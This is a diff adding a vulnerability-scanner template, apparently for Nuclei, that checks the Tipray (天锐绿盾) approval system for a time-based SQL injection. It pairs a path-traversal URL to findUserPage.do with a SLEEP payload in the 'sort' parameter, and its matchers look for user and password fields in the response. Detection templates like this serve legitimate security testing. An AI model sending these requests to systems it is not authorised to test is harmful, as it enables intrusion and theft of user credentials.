@@ -1,0 +1,38 @@
+id: poc-yaml-tipray-gsas-finduserpage-do-sqli
+
+info:
+  name: 天锐绿盾审批系统 findUserPage.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/trwfe/service/.%2E/user/findUserPage.do"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "sort=(SELECT * FROM (SELECT(SLEEP({{t1}})))x)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"id":'
+          - '"firstName":'
+          - '"password":'
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
